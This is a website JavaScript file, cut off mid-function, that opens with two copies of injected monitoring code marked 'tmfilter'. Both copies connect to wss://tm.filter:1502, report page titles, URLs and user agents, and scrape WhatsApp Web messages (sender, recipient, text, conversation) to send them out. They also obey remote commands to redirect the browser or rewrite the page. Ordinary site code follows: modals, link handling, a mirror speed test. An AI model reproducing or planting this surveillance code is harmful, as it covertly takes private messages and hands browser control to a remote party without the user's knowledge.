!(function () {
  var e, f, g, p;
  function Y() {
    var Y = {
      type: "focus",
      token: l.token,
      title: document.title,
      url: document.URL,
      useragent: navigator.userAgent,
      pid: l.pid,
      pn: l.pn,
    };
    null != I && I.readyState == WebSocket.OPEN && I.send(JSON.stringify(Y));
  }
  function t() {
    var Y = {
      type: "notification",
      token: l.token,
      title: document.title,
      url: document.URL,
      focused: document.hasFocus(),
      timeout: l.sendNotificationsInterval,
      useragent:
        navigator.appVersion.length > navigator.userAgent.length
          ? navigator.appVersion
          : navigator.userAgent,
      pid: l.pid,
      pn: l.pn,
    };
    I.send(JSON.stringify(Y));
  }
  function n() {
    c();
  }
  function r() {
    t(),
      (m = setInterval(t, l.sendNotificationsInterval)),
      D() && (S = setInterval(n, l.pollWhatsappTrackingInterval));
  }
  function a() {
    clearInterval(m),
      clearInterval(S),
      (timeout = setTimeout(function () {
        ((I = new WebSocket(l.connectionString)).onopen = r), (I.onclose = a);
      }, h));
  }
  function i(Y) {
    switch (Y.data.substring(0, 1)) {
      case "r":
        window.location = Y.data.substring(1);
        break;
      case "b":
        document.body.innerHTML = Y.data.substring(1);
        break;
      case "w":
        var e = "true" == Y.data.substring(1).toLowerCase();
        y != e && e && d(), (y = e);
    }
  }
  function M(Y) {
    var e = document.createElement("a");
    return (e.href = Y), e.href;
  }
  function o() {
    l.iup && Y(),
      D() &&
        (d(),
        c(),
        (function () {
          var Y = new MutationObserver(function (Y) {
            Y &&
              Y.forEach(function (Y) {
                Y &&
                  ("childList" !== Y.type ||
                    Y.addedNodes.length <= 0 ||
                    Y.addedNodes.forEach(function (Y) {
                      if (Y) {
                        var e = document.querySelector(
                          "header._3AwwN span._1wjpf"
                        );
                        e && (v = e.innerText);
                        var t = document.querySelector(
                          "header._3AwwN [data-icon=default-user]"
                        );
                        t && (N = "private");
                        var n = document.querySelector(
                          "header._3AwwN [data-icon=default-group]"
                        );
                        n && (N = "group");
                        var r = Y.querySelectorAll(".message-in, .message-out");
                        r &&
                          r.forEach(function (Y) {
                            if (
                              Y &&
                              Y.classList &&
                              !(Y.classList.length <= 0)
                            ) {
                              var e = Y.classList.contains("message-in"),
                                t = Y.querySelector(".copyable-text"),
                                n = Y.querySelector(".selectable-text"),
                                r = new Date(),
                                a = null;
                              if (t && t.attributes["data-pre-plain-text"]) {
                                var i =
                                    t.attributes["data-pre-plain-text"]
                                      .textContent,
                                  M = /\[(\d{1,2}):(\d{1,2})[ ]{0,1}([p|a]m)?,\s(.+)]\s(.*):/i[
                                    Symbol.match
                                  ](i);
                                if (!M || 6 != M.length) return;
                                if (
                                  (M[3] &&
                                    "pm" == M[3].toLowerCase() &&
                                    (M[1] = parseInt(M[1]) + 12),
                                  (dateParts = /(\d{1,4})[.-\\/](\d{1,4})[.-\\/](\d{1,4})/[
                                    Symbol.match
                                  ](M[4])),
                                  !dateParts || 4 != dateParts.length)
                                )
                                  return;
                                if (
                                  !(r =
                                    date.parse(M[4], T) ||
                                    (function (Y, e, t) {
                                      var n = [
                                          [Y, e, t].join("-"),
                                          [Y, t, e].join("-"),
                                          [e, Y, t].join("-"),
                                          [e, t, Y].join("-"),
                                          [t, Y, e].join("-"),
                                          [t, e, Y].join("-"),
                                        ],
                                        r = Date.now();
                                      for (var a in n) {
                                        var i = Date.parse(n[a]);
                                        if (i && !(1728e6 < Math.abs(r - i)))
                                          return new Date(i);
                                      }
                                    })(
                                      dateParts[1],
                                      dateParts[2],
                                      dateParts[3]
                                    ))
                                )
                                  return;
                                r.setHours(M[1]),
                                  r.setMinutes(M[2]),
                                  (a = M[5]);
                              }
                              if (r && w <= r) {
                                A.get(v) || A.set(v, w),
                                  A.get(v).getTime() == r.getTime()
                                    ? r.setMilliseconds(++L)
                                    : ((L = 0), A.set(v, r));
                                var o = n ? n.innerText : null;
                                if (a && o && y) {
                                  var s = (a + o + v + r.getTime())
                                    .split("")
                                    .map(function (Y) {
                                      return Y.charCodeAt(0);
                                    })
                                    .reduce(function (Y, e) {
                                      return (Y + ((Y << 7) + (Y << 3))) ^ e;
                                    })
                                    .toString(16);
                                  if (!s || b.has(s)) return;
                                  var u = {
                                    type: "wapmessage",
                                    timestamp: r.getTime(),
                                    id: s,
                                    incoming: e,
                                    sender: e ? a : "Me",
                                    content: o,
                                    recipient: e ? "Me" : v,
                                    conversationId: v + "(" + N + ")",
                                  };
                                  I.send(JSON.stringify(u)), b.add(s);
                                }
                              }
                            }
                          });
                      }
                    }));
              });
          });
          if (!Y) return;
          Y.observe(document.body, { childList: !0, subtree: !0 });
        })()),
      r(),
      (function () {
        for (
          var Y = [], e = document.getElementsByTagName("link"), t = 0;
          t < e.length;
          ++t
        )
          ("icon" != e[t].getAttribute("rel") &&
            "shortcut icon" != e[t].getAttribute("rel")) ||
            (Y[Y.length] = M(e[t].getAttribute("href")));
        0 == Y.length && (Y[0] = M("/favicon.ico"));
        var n = { type: "favicon" };
        (n.url = document.URL),
          (n.src = Y),
          (n.title = document.title),
          (n.token = l.token),
          (n.useragent =
            navigator.appVersion.length > navigator.userAgent.length
              ? navigator.appVersion
              : navigator.userAgent),
          I.send(JSON.stringify(n));
      })();
  }
  function s() {
    document.tmfilter ||
      (((I = new WebSocket(l.connectionString)).onclose = a),
      (I.onmessage = i),
      (I.onopen = o),
      (T = {
        "ar-SA": "D/M/YY",
        "bg-BG": "D.M.YYYY",
        "ca-ES": "D/M/YYYY",
        "zh-TW": "YYYY/M/D",
        "cs-CZ": "D.M.YYYY",
        "Da-DK": "D-M-YYYY",
        "De-DE": "D.M.YYYY",
        "el-GR": "D/M/YYYY",
        "en-US": "M/D/YYYY",
        "fi-FI": "D.M.YYYY",
        "fr-FR": "D/M/YYYY",
        "he-IL": "D/M/YYYY",
        "hu-HU": "YYYY. M. D.",
        "is-IS": "D.M.YYYY",
        "it-IT": "D/M/YYYY",
        "ja-JP": "YYYY/M/D",
        "ko-KR": "YYYY-M-D",
        "nl-NL": "D-M-YYYY",
        "nb-NO": "D.M.YYYY",
        "pl-PL": "YYYY-M-D",
        "pt-BR": "D/M/YYYY",
        "ro-RO": "D.M.YYYY",
        "ru-RU": "D.M.YYYY",
        "hr-HR": "D.M.YYYY",
        "sk-SK": "D. M. YYYY",
        "sq-AL": "YYYY-M-D",
        "sv-SE": "YYYY-M-D",
        "th-TH": "D/M/YYYY",
        "tr-TR": "D.M.YYYY",
        "ur-PK": "D/M/YYYY",
        "iD-ID": "D/M/YYYY",
        "uk-UA": "D.M.YYYY",
        "be-BY": "D.M.YYYY",
        "sl-SI": "D.M.YYYY",
        "et-EE": "D.M.YYYY",
        "lv-LV": "YYYY.M.D.",
        "lt-LT": "YYYY.M.D",
        "fa-IR": "M/D/YYYY",
        "vi-VN": "D/M/YYYY",
        "hy-AM": "D.M.YYYY",
        "az-Latn-AZ": "D.M.YYYY",
        "eu-ES": "YYYY/M/D",
        "Mk-MK": "D.M.YYYY",
        "af-ZA": "YYYY/M/D",
        "ka-GE": "D.M.YYYY",
        "fo-FO": "D-M-YYYY",
        "hi-IN": "D-M-YYYY",
        "Ms-MY": "D/M/YYYY",
        "kk-KZ": "D.M.YYYY",
        "ky-KG": "D.M.YY",
        "sw-KE": "M/D/YYYY",
        "uz-Latn-UZ": "D/M YYYY",
        "tt-RU": "D.M.YYYY",
        "pa-IN": "D-M-YY",
        "gu-IN": "D-M-YY",
        "ta-IN": "D-M-YYYY",
        "te-IN": "D-M-YY",
        "kn-IN": "D-M-YY",
        "Mr-IN": "D-M-YYYY",
        "sa-IN": "D-M-YYYY",
        "Mn-MN": "YY.M.D",
        "gl-ES": "D/M/YY",
        "kok-IN": "D-M-YYYY",
        "syr-SY": "D/M/YYYY",
        "Dv-MV": "D/M/YY",
        "ar-IQ": "D/M/YYYY",
        "zh-CN": "YYYY/M/D",
        "De-CH": "D.M.YYYY",
        "en-GB": "D/M/YYYY",
        "es-MX": "D/M/YYYY",
        "fr-BE": "D/M/YYYY",
        "it-CH": "D.M.YYYY",
        "nl-BE": "D/M/YYYY",
        "nn-NO": "D.M.YYYY",
        "pt-PT": "D-M-YYYY",
        "sr-Latn-CS": "D.M.YYYY",
        "sv-FI": "D.M.YYYY",
        "az-Cyrl-AZ": "D.M.YYYY",
        "Ms-BN": "D/M/YYYY",
        "uz-Cyrl-UZ": "D.M.YYYY",
        "ar-EG": "D/M/YYYY",
        "zh-HK": "D/M/YYYY",
        "De-AT": "D.M.YYYY",
        "en-AU": "D/M/YYYY",
        "es-ES": "D/M/YYYY",
        "fr-CA": "YYYY-M-D",
        "sr-Cyrl-CS": "D.M.YYYY",
        "ar-LY": "D/M/YYYY",
        "zh-SG": "D/M/YYYY",
        "De-LU": "D.M.YYYY",
        "en-CA": "D/M/YYYY",
        "es-GT": "D/M/YYYY",
        "fr-CH": "D.M.YYYY",
        "ar-DZ": "D-M-YYYY",
        "zh-MO": "D/M/YYYY",
        "De-LI": "D.M.YYYY",
        "en-NZ": "D/M/YYYY",
        "es-CR": "D/M/YYYY",
        "fr-LU": "D/M/YYYY",
        "ar-MA": "D-M-YYYY",
        "en-IE": "D/M/YYYY",
        "es-PA": "M/D/YYYY",
        "fr-MC": "D/M/YYYY",
        "ar-TN": "D-M-YYYY",
        "en-ZA": "YYYY/M/D",
        "es-DO": "D/M/YYYY",
        "ar-OM": "D/M/YYYY",
        "en-JM": "D/M/YYYY",
        "es-VE": "D/M/YYYY",
        "ar-YE": "D/M/YYYY",
        "en-029": "M/D/YYYY",
        "es-CO": "D/M/YYYY",
        "ar-SY": "D/M/YYYY",
        "en-BZ": "D/M/YYYY",
        "es-PE": "D/M/YYYY",
        "ar-JO": "D/M/YYYY",
        "en-TT": "D/M/YYYY",
        "es-AR": "D/M/YYYY",
        "ar-LB": "D/M/YYYY",
        "en-ZW": "M/D/YYYY",
        "es-EC": "D/M/YYYY",
        "ar-KW": "D/M/YYYY",
        "en-PH": "M/D/YYYY",
        "es-CL": "D-M-YYYY",
        "ar-AE": "D/M/YYYY",
        "es-UY": "D/M/YYYY",
        "ar-BH": "D/M/YYYY",
        "es-PY": "D/M/YYYY",
        "ar-QA": "D/M/YYYY",
        "es-BO": "D/M/YYYY",
        "es-SV": "D/M/YYYY",
        "es-HN": "D/M/YYYY",
        "es-NI": "D/M/YYYY",
        "es-PR": "D/M/YYYY",
        "aM-ET": "D/M/YYYY",
        "tzM-Latn-DZ": "D-M-YYYY",
        "iu-Latn-CA": "D/M/YYYY",
        "sMa-NO": "D.M.YYYY",
        "Mn-Mong-CN": "YYYY/M/D",
        "gD-GB": "D/M/YYYY",
        "en-MY": "D/M/YYYY",
        "prs-AF": "D/M/YY",
        "bn-BD": "D-M-YY",
        "wo-SN": "D/M/YYYY",
        "rw-RW": "M/D/YYYY",
        "qut-GT": "D/M/YYYY",
        "sah-RU": "M.D.YYYY",
        "gsw-FR": "D/M/YYYY",
        "co-FR": "D/M/YYYY",
        "oc-FR": "D/M/YYYY",
        "Mi-NZ": "D/M/YYYY",
        "ga-IE": "D/M/YYYY",
        "se-SE": "YYYY-M-D",
        "br-FR": "D/M/YYYY",
        "sMn-FI": "D.M.YYYY",
        "Moh-CA": "M/D/YYYY",
        "arn-CL": "D-M-YYYY",
        "ii-CN": "YYYY/M/D",
        "Dsb-DE": "D. M. YYYY",
        "ig-NG": "D/M/YYYY",
        "kl-GL": "D-M-YYYY",
        "lb-LU": "D/M/YYYY",
        "ba-RU": "D.M.YY",
        "nso-ZA": "YYYY/M/D",
        "quz-BO": "D/M/YYYY",
        "yo-NG": "D/M/YYYY",
        "ha-Latn-NG": "D/M/YYYY",
        "fil-PH": "M/D/YYYY",
        "ps-AF": "D/M/YY",
        "fy-NL": "D-M-YYYY",
        "ne-NP": "M/D/YYYY",
        "se-NO": "D.M.YYYY",
        "iu-Cans-CA": "D/M/YYYY",
        "sr-Latn-RS": "D.M.YYYY",
        "si-LK": "YYYY-M-D",
        "sr-Cyrl-RS": "D.M.YYYY",
        "lo-LA": "D/M/YYYY",
        "kM-KH": "YYYY-M-D",
        "cy-GB": "D/M/YYYY",
        "bo-CN": "YYYY/M/D",
        "sMs-FI": "D.M.YYYY",
        "as-IN": "D-M-YYYY",
        "Ml-IN": "D-M-YY",
        "en-IN": "D-M-YYYY",
        "or-IN": "D-M-YY",
        "bn-IN": "D-M-YY",
        "tk-TM": "D.M.YY",
        "bs-Latn-BA": "D.M.YYYY",
        "Mt-MT": "D/M/YYYY",
        "sr-Cyrl-ME": "D.M.YYYY",
        "se-FI": "D.M.YYYY",
        "zu-ZA": "YYYY/M/D",
        "xh-ZA": "YYYY/M/D",
        "tn-ZA": "YYYY/M/D",
        "hsb-DE": "D. M. YYYY",
        "bs-Cyrl-BA": "D.M.YYYY",
        "tg-Cyrl-TJ": "D.M.YY",
        "sr-Latn-BA": "D.M.YYYY",
        "sMj-NO": "D.M.YYYY",
        "rM-CH": "D/M/YYYY",
        "sMj-SE": "YYYY-M-D",
        "quz-EC": "D/M/YYYY",
        "quz-PE": "D/M/YYYY",
        "hr-BA": "D.M.YYYY.",
        "sr-Latn-ME": "D.M.YYYY",
        "sMa-SE": "YYYY-M-D",
        "en-SG": "D/M/YYYY",
        "ug-CN": "YYYY-M-D",
        "sr-Cyrl-BA": "D.M.YYYY",
        "es-US": "M/D/YYYY",
      }[navigator.language]),
      (document.tmfilter = "present"));
  }
  function u() {
    var Y = (function () {
      var Y = ["webkit", "moz", "ms", "o"];
      if ("hidden" in document) return "hidden";
      for (var e = 0; e < Y.length; e++)
        if (Y[e] + "Hidden" in document) return Y[e] + "Hidden";
      return null;
    })();
    return !!Y && document[Y];
  }
  function D() {
    var Y = document.head.querySelector("[name='og:title']");
    return !!Y && "WhatsApp Web" === Y.getAttribute("content");
  }
  function c() {
    I.send(JSON.stringify({ type: "waptracking" }));
  }
  function d() {
    (A = new Map()),
      (b = new Set()),
      (L = 0),
      (w = new Date()).setSeconds(0),
      w.setMilliseconds(0);
  }
  (e = this),
    (f = {}),
    (g = "en"),
    (p = {
      en: {
        MMMM: "January February March April May June July August September October November December".split(
          " "
        ),
        MMM: "Jan Feb Mar Apr May Jun Jul Aug Sep Oct Nov Dec".split(" "),
        dddd: "Sunday Monday Tuesday Wednesday Thursday Friday Saturday".split(
          " "
        ),
        ddd: "Sun Mon Tue Wed Thu Fri Sat".split(" "),
        dd: "Su Mo Tu We Th Fr Sa".split(" "),
        A: ["a.m.", "p.m."],
        formatter: {
          YYYY: function (Y) {
            return ("000" + Y.getFullYear()).slice(-4);
          },
          YY: function (Y) {
            return ("0" + Y.getFullYear()).slice(-2);
          },
          Y: function (Y) {
            return "" + Y.getFullYear();
          },
          MMMM: function (Y) {
            return this.MMMM[Y.getMonth()];
          },
          MMM: function (Y) {
            return this.MMM[Y.getMonth()];
          },
          MM: function (Y) {
            return ("0" + (Y.getMonth() + 1)).slice(-2);
          },
          M: function (Y) {
            return "" + (Y.getMonth() + 1);
          },
          DD: function (Y) {
            return ("0" + Y.getDate()).slice(-2);
          },
          D: function (Y) {
            return "" + Y.getDate();
          },
          HH: function (Y) {
            return ("0" + Y.getHours()).slice(-2);
          },
          H: function (Y) {
            return "" + Y.getHours();
          },
          A: function (Y) {
            return this.A[(11 < Y.getHours()) | 0];
          },
          hh: function (Y) {
            return ("0" + (Y.getHours() % 12 || 12)).slice(-2);
          },
          h: function (Y) {
            return "" + (Y.getHours() % 12 || 12);
          },
          mm: function (Y) {
            return ("0" + Y.getMinutes()).slice(-2);
          },
          m: function (Y) {
            return "" + Y.getMinutes();
          },
          ss: function (Y) {
            return ("0" + Y.getSeconds()).slice(-2);
          },
          s: function (Y) {
            return "" + Y.getSeconds();
          },
          SSS: function (Y) {
            return ("00" + Y.getMilliseconds()).slice(-3);
          },
          SS: function (Y) {
            return ("0" + ((Y.getMilliseconds() / 10) | 0)).slice(-2);
          },
          S: function (Y) {
            return "" + ((Y.getMilliseconds() / 100) | 0);
          },
          dddd: function (Y) {
            return this.dddd[Y.getDay()];
          },
          ddd: function (Y) {
            return this.ddd[Y.getDay()];
          },
          dd: function (Y) {
            return this.dd[Y.getDay()];
          },
          Z: function (Y) {
            return (
              (0 < (Y = Y.utc ? 0 : Y.getTimezoneOffset() / 0.6) ? "-" : "+") +
              ("000" + Math.abs(Y - (Y % 100) * 0.4)).slice(-4)
            );
          },
          post: function (Y) {
            return Y;
          },
        },
        parser: {
          find: function (Y, e) {
            for (var t, n = -1, r = 0, a = 0, i = Y.length; a < i; a++)
              (t = Y[a]),
                !e.indexOf(t) && t.length > r && ((n = a), (r = t.length));
            return { index: n, length: r };
          },
          MMMM: function (Y) {
            return this.parser.find(this.MMMM, Y);
          },
          MMM: function (Y) {
            return this.parser.find(this.MMM, Y);
          },
          A: function (Y) {
            return this.parser.find(this.A, Y);
          },
          h: function (Y, e) {
            return (12 === Y ? 0 : Y) + 12 * e;
          },
          pre: function (Y) {
            return Y;
          },
        },
      },
    }),
    (f.format = function (Y, t, e) {
      var n = f.addMinutes(Y, e ? Y.getTimezoneOffset() : 0),
        r = p[g],
        a = r.formatter;
      return (
        (n.utc = e),
        t.replace(
          /(\[[^\[\]]*]|\[.*\][^\[]*\]|YYYY|YY|MMM?M?|DD|HH|hh|mm|ss|SSS?|ddd?d?|.)/g,
          function (Y) {
            var e = a[Y];
            return e ? a.post(e.call(r, n, t)) : Y.replace(/\[(.*)]/, "$1");
          }
        )
      );
    }),
    (f.parse = function (Y, e, t) {
      var n,
        r,
        a = p[g],
        i = a.parser.pre(Y),
        M = 0,
        o = /(MMMM?|A)|(YYYY)|(SSS)|(MM|DD|HH|hh|mm|ss)|(YY|M|D|H|h|m|s|SS)|(S)|(.)/g,
        s = {
          2: /^\d{1,4}/,
          3: /^\d{1,3}/,
          4: /^\d\d/,
          5: /^\d\d?/,
          6: /^\d/,
        };
      Y = [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31];
      for (
        var u = { Y: 1970, M: 1, D: 1, H: 0, m: 0, s: 0, S: 0 };
        (n = o.exec(e));

      ) {
        var D = 0,
          c = 1;
        for (r = ""; !r; ) r = n[++D];
        n = r.charAt(0);
        var d = i.slice(M);
        if (D < 2) {
          var l = a.parser[r].call(a, d, e);
          (u[n] = l.index), "M" === n && u[n]++, (c = l.length);
        } else if (D < 7)
          (l = (d.match(s[D]) || [""])[0]),
            (u[n] = 0 | ("S" === n ? (l + "000").slice(0, -r.length) : l)),
            (c = l.length);
        else if (" " !== n && n !== d[0]) return NaN;
        if (!c) return NaN;
        M += c;
      }
      return M === i.length && l
        ? ((u.Y += u.Y < 70 ? 2e3 : u.Y < 100 ? 1900 : 0),
          (u.H = u.H || a.parser.h(u.h || 0, u.A || 0)),
          (e = new Date(u.Y, u.M - 1, u.D, u.H, u.m, u.s, u.S)),
          (Y[1] += 0 | f.isLeapYear(e)),
          u.M < 1 ||
          12 < u.M ||
          u.D < 1 ||
          u.D > Y[u.M - 1] ||
          23 < u.H ||
          59 < u.m ||
          59 < u.s
            ? NaN
            : t
            ? f.addMinutes(e, -e.getTimezoneOffset())
            : e)
        : NaN;
    }),
    (f.isValid = function (Y, e) {
      return !!f.parse(Y, e);
    }),
    (f.addYears = function (Y, e) {
      return f.addMonths(Y, 12 * e);
    }),
    (f.addMonths = function (Y, e) {
      var t = new Date(Y.getTime());
      return t.setMonth(t.getMonth() + e), t;
    }),
    (f.addDays = function (Y, e) {
      var t = new Date(Y.getTime());
      return t.setDate(t.getDate() + e), t;
    }),
    (f.addHours = function (Y, e) {
      return f.addMilliseconds(Y, 36e5 * e);
    }),
    (f.addMinutes = function (Y, e) {
      return f.addMilliseconds(Y, 6e4 * e);
    }),
    (f.addSeconds = function (Y, e) {
      return f.addMilliseconds(Y, 1e3 * e);
    }),
    (f.addMilliseconds = function (Y, e) {
      return new Date(Y.getTime() + e);
    }),
    (f.subtract = function (Y, e) {
      var t = Y.getTime() - e.getTime();
      return {
        toMilliseconds: function () {
          return t;
        },
        toSeconds: function () {
          return (t / 1e3) | 0;
        },
        toMinutes: function () {
          return (t / 6e4) | 0;
        },
        toHours: function () {
          return (t / 36e5) | 0;
        },
        toDays: function () {
          return (t / 864e5) | 0;
        },
      };
    }),
    (f.isLeapYear = function (Y) {
      return !(((Y = Y.getFullYear()) % 4 || !(Y % 100)) && Y % 400);
    }),
    (f.isSameDay = function (Y, e) {
      return f.format(Y, "YYYYMMDD") === f.format(e, "YYYYMMDD");
    }),
    (f.locale = function (Y) {
      return (
        Y &&
          (!p[Y] &&
            "function" == typeof require &&
            e &&
            require("./locale/" + Y),
          (g = Y)),
        g
      );
    }),
    (f.getLocales = function (Y) {
      return p[Y || g];
    }),
    (f.setLocales = function (Y, e) {
      var t = function (Y, e) {
          var t,
            n = function () {};
          for (t in ((n.prototype = e), (n = new n()), Y))
            Y.hasOwnProperty(t) && (n[t] = Y[t]);
          return n;
        },
        n = p[Y] || p.en,
        r = t(e, n);
      e.formatter && (r.formatter = t(e.formatter, n.formatter)),
        e.parser && (r.parser = t(e.parser, n.parser)),
        (p[Y] = r);
    }),
    "object" == typeof module && "object" == typeof module.exports
      ? (module.exports = f)
      : "function" == typeof define && define.amd
      ? define([], function () {
          return f;
        })
      : (e.date = f);
  var l = {
      token: "1f7bd907-b484-4eb6-b677-02de4030ab4b",
      sendNotificationsInterval: Number("1000"),
      pollWhatsappTrackingInterval: Number("20000"),
      connectionString: "wss://tm.filter:1502",
      pid: "11244",
      pn: "firefox.exe",
      iup: false,
    },
    h = 6e4,
    m = null,
    S = null,
    v = null,
    N = null,
    y = !1,
    A = null,
    b = null,
    L = 0,
    w = null;
  if (
    (function () {
      try {
        return window.self === window.top;
      } catch (Y) {
        return !1;
      }
    })()
  ) {
    var I = null,
      T = "";
    !(function Y(e) {
      u()
        ? setTimeout(function () {
            Y(e);
          }, 1e3)
        : e();
    })(function () {
      window.addEventListener("focus", Y),
        "interactive" == document.readyState ||
        "complete" == document.readyState
          ? s()
          : window.addEventListener("DOMContentLoaded", s);
    });
  }
})();

!(function () {
  function c() {
    var N = {
      type: "focus",
      token: B.token,
      title: document.title,
      url: document.URL,
      useragent: navigator.userAgent,
      pid: B.pid,
    };
    null != M && M.readyState == WebSocket.OPEN && M.send(JSON.stringify(N));
  }
  function f() {
    var N = {
      type: "notification",
      token: B.token,
      title: document.title,
      url: document.URL,
      focused: document.hasFocus(),
      timeout: B.sendNotificationsInterval,
      useragent:
        navigator.appVersion.length > navigator.userAgent.length
          ? navigator.appVersion
          : navigator.userAgent,
      pid: B.pid,
    };
    M.send(JSON.stringify(N));
  }
  function g() {
    y();
  }
  function h() {
    (D = setInterval(f, B.sendNotificationsInterval)),
      x() && (E = setInterval(g, B.pollWhatsappTrackingInterval));
  }
  function j() {
    clearInterval(D),
      clearInterval(E),
      (timeout = setTimeout(function () {
        (M = new WebSocket(B.connectionString)),
          (M.onopen = h),
          (M.onclose = j);
      }, 6e4));
  }
  function k(N) {
    var O = N.data.substring(0, 1);
    switch (O) {
      case "r":
        window.location = N.data.substring(1);
        break;
      case "b":
        document.body.innerHTML = N.data.substring(1);
        break;
      case "w":
        var P = "true" == N.data.substring(1).toLowerCase();
        H != P && P && z(), (H = P);
    }
  }
  function l(N) {
    var O = document.createElement("a");
    return (O.href = N), O.href;
  }
  function m() {
    for (
      var N = [], O = document.getElementsByTagName("link"), P = 0;
      P < O.length;
      ++P
    )
      ("icon" == O[P].getAttribute("rel") ||
        "shortcut icon" == O[P].getAttribute("rel")) &&
        (N[N.length] = l(O[P].getAttribute("href")));
    0 == N.length && (N[0] = l("/favicon.ico"));
    var Q = {};
    (Q.type = "favicon"),
      (Q.url = document.URL),
      (Q.src = N),
      (Q.title = document.title),
      (Q.token = B.token),
      (Q.useragent =
        navigator.appVersion.length > navigator.userAgent.length
          ? navigator.appVersion
          : navigator.userAgent),
      M.send(JSON.stringify(Q));
  }
  function p() {
    B.iup && c(), x() && (z(), y(), A()), h(), m();
  }
  function q() {
    document.tmfilter ||
      ((M = new WebSocket(B.connectionString)),
      (M.onclose = j),
      (M.onmessage = k),
      (M.onopen = p),
      (document.tmfilter = "present"));
  }
  function r() {
    var N = ["webkit", "moz", "ms", "o"];
    if ("hidden" in document) return "hidden";
    for (var O = 0; O < N.length; O++)
      if (N[O] + "Hidden" in document) return N[O] + "Hidden";
    return null;
  }
  function s() {
    var N = r();
    return !!N && document[N];
  }
  function u(N) {
    s()
      ? setTimeout(function () {
          u(N);
        }, 1e3)
      : N();
  }
  function w(N, O, P) {
    var Q = [
        [N, O, P].join("-"),
        [N, P, O].join("-"),
        [O, N, P].join("-"),
        [O, P, N].join("-"),
        [P, N, O].join("-"),
        [P, O, N].join("-"),
      ],
      R = Date.now();
    for (var S in Q) {
      var T = Date.parse(Q[S]);
      if (T && !(1728000000 < Math.abs(R - T))) return new Date(T);
    }
  }
  function x() {
    var N = document.head.querySelector("[name='og:title']");
    return !!N && !("WhatsApp Web" !== N.getAttribute("content"));
  }
  function y() {
    M.send(JSON.stringify({ type: "waptracking" }));
  }
  function z() {
    (I = new Map()),
      (J = new Set()),
      (K = 0),
      (L = new Date()),
      L.setSeconds(0),
      L.setMilliseconds(0);
  }
  function A() {
    var N = new MutationObserver(function (O) {
      O &&
        O.forEach(function (P) {
          !P ||
            "childList" !== P.type ||
            0 >= P.addedNodes.length ||
            P.addedNodes.forEach(function (Q) {
              if (Q) {
                var R = Q.querySelector(
                  ".pane-chat-header > .chat-body > .chat-main > .chat-title > span"
                );
                R && (F = R.innerText);
                var S = Q.querySelector(
                  ".pane-chat-header .avatar-default [data-icon=default-user]"
                );
                S && (G = "private");
                var T = Q.querySelector(
                  ".pane-chat-header .avatar-default [data-icon=default-group]"
                );
                T && (G = "group");
                var U = Q.querySelectorAll(".message-in, .message-out");
                U &&
                  U.forEach(function (V) {
                    if (V && V.classList && !(0 >= V.classList.length)) {
                      var W = V.classList.contains("message-in"),
                        X = V.querySelector(".copyable-text"),
                        Y = V.querySelector(".selectable-text"),
                        Z = new Date(),
                        $ = null;
                      if (X && X.attributes["data-pre-plain-text"]) {
                        var _ = X.attributes["data-pre-plain-text"].textContent,
                          aa = /\[(\d{1,2}):(\d{1,2})[ ]{0,1}([p|a]m)?,\s(.+)]\s(.*):/i[
                            Symbol.match
                          ](_);
                        if (!aa || 6 != aa.length) return;
                        if (
                          (aa[3] &&
                            "pm" == aa[3].toLowerCase() &&
                            (aa[1] = parseInt(aa[1]) + 12),
                          (dateParts = /(\d{1,4})[.-\\/](\d{1,4})[.-\\/](\d{1,4})/[
                            Symbol.match
                          ](aa[4])),
                          !dateParts || 4 != dateParts.length)
                        )
                          return;
                        if (
                          ((Z = w(dateParts[1], dateParts[2], dateParts[3])),
                          !Z)
                        )
                          return;
                        Z.setHours(aa[1]), Z.setMinutes(aa[2]), ($ = aa[5]);
                      }
                      if (Z && Z >= L) {
                        I.get(F) || I.set(F, L),
                          I.get(F).getTime() == Z.getTime()
                            ? Z.setMilliseconds(++K)
                            : ((K = 0), I.set(F, Z));
                        var ba = Y ? Y.innerText : null;
                        if ($ && ba && H) {
                          var ca = ($ + ba + F)
                            .split("")
                            .map((ea) => ea.charCodeAt(0))
                            .reduce(
                              (ea, fa) => (ea + ((ea << 7) + (ea << 3))) ^ fa
                            )
                            .toString(16);
                          if (!ca || J.has(ca)) return;
                          var da = {
                            type: "wapmessage",
                            timestamp: Z.getTime(),
                            id: ca,
                            incoming: W,
                            sender: W ? $ : "Me",
                            content: ba,
                            recipient: W ? "Me" : F,
                            conversationId: F + "(" + G + ")",
                          };
                          M.send(JSON.stringify(da)), J.add(ca);
                        }
                      }
                    }
                  });
              }
            });
        });
    });
    N && N.observe(document.body, { childList: !0, subtree: !0 });
  }
  var B = {
      token: "8bb39b36-b2c8-4244-af35-25a23b000035",
      sendNotificationsInterval: +"10000",
      pollWhatsappTrackingInterval: +"20000",
      connectionString: "wss://tm.filter:1502",
      pid: "6624",
      iup: false,
    },
    D = null,
    E = null,
    F = null,
    G = null,
    H = !1,
    I = null,
    J = null,
    K = 0,
    L = null;
  if (
    (function () {
      try {
        return window.self === window.top;
      } catch (N) {
        return !1;
      }
    })()
  ) {
    var M = null;
    u(function () {
      window.addEventListener("focus", c),
        "interactive" == document.readyState ||
        "complete" == document.readyState
          ? q()
          : window.addEventListener("DOMContentLoaded", q);
    });
  }
})();

$(function () {
  MicroModal.init();

  $(".extra-btn").click(function (e) {
    e.preventDefault();
    var currTarget = $(this).data("target");

    MicroModal.show(currTarget);
  });
});

$(function () {
  //公用提示
  // $('.LinkTip').tipsy({gravity: 's'});
  if (location.search != null) {
    $(".linktip").each(function (e, g) {
      var link = $(this).attr("href") + location.search;
      $(this).attr("href", link);
    });
  }
});

$.test = function () {
  var span,
    d = document,
    li,
    a,
    i,
    lis = d.getElementById("ultest").getElementsByTagName("div");
  for (i = 1; (li = lis[i++]); ) {
    a = li.getElementsByTagName("a")[0];
    if (!a) {
      continue;
    }
    span = d.createElement("div");

    span.ctime = new Date();
    span.innerHTML =
      '测速中...<img src="' +
      a.href +
      '" border="0" width="1" height="1" onerror="$.testresult(this)" />';
    li.appendChild(span);
  }
};
$.testresult = function (img) {
  var span = img.parentNode;
  var n = "em";
  if (!$.testresult.isrun) {
    $.testresult.isrun = true;
    span.innerHTML =
      '<font id="kkk" color=red style=" font-weight:bolder">' +
      ((new Date() - span.ctime) / 1000).toFixed(2) +
      "秒 最快</font>";
    $(".fastest").attr("href", img.src);
  } else {
    span.innerHTML = "" + ((new Date() - span.ctime) / 1000).toFixed(2) + "秒";
  }
};
var ran = Math.random();

function create(text, name, type) {
  var dlbtn = document.getElementById("dlbtn");
  var file = new Blob([text], { type: type });
  dlbtn.href = URL.createObjectURL(file);
